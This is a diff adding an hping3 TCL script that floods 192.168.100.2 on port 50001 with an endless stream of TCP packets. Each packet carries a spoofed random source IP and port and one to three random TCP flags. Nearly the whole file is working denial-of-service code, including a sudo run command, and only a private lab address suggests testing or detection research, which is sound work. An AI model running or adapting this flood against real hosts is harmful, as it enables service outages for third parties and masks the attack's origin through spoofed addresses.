@@ -1,0 +1,63 @@
+# Hping3 TCP Random Flags Flood with TCL script
+# TCP Flood (rand source IP/port, dest port 50001, random TCP flags, window=8192, seq=0, no payload) for hping3 TCL mode
+
+set dst_ip "192.168.100.2"
+set dst_port 50001
+set window 8192
+set seq 0
+set count 0
+
+# List of possible TCP flags (s=SYN, f=FIN, r=RST, p=PSH, a=ACK, u=URG, y=ECN/CWR, e=ECE)
+set flags_list {s f r p a u y e}
+
+# Function to generate random IP address
+proc random_ip {} {
+    return "[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}]"
+}
+
+# Function to generate random source port (1024–65535)
+proc random_port {} {
+    return [expr {int(rand()*64512) + 1024}]
+}
+
+# Function to shuffle a list
+proc shuffle_list {lst} {
+    set n [llength $lst]
+    set res $lst
+    for {set i 0} {$i < $n} {incr i} {
+        set j [expr {int(rand()*$n)}]
+        # swap i <-> j
+        set tmp [lindex $res $i]
+        set res [lreplace $res $i $i [lindex $res $j]]
+        set res [lreplace $res $j $j $tmp]
+    }
+    return $res
+}
+
+# Function to generate a random flag string (1–3 flags on)
+proc random_flags {} {
+    global flags_list
+    set n_flags [expr {1 + int(rand()*3)}]  ;# between 1 and 3 flags set
+    set shuffled_flags [shuffle_list $flags_list]
+    set chosen_flags ""
+    for {set i 0} {$i < $n_flags} {incr i} {
+        append chosen_flags [lindex $shuffled_flags $i]
+    }
+    return $chosen_flags
+}
+
+while {1} {
+    set saddr [random_ip]
+    set sport [random_port]
+    set flags [random_flags]
+    # TCP packet: random source IP/port, dest port 50001, random flags, window 8192, seq 0, no payload
+    set pkt "ip(saddr=$saddr,daddr=$dst_ip,ttl=64)+tcp(sport=$sport,dport=$dst_port,flags=$flags,win=$window,seq=$seq)"
+    hping send $pkt
+    incr count
+    # Print every 1000 packets sent
+    if {[expr {$count % 1000}] == 0} {
+        puts "$count TCP random-flags packets sent so far..."
+    }
+}
+
+# To run: sudo hping3 exec tcp_random_flags.htcl
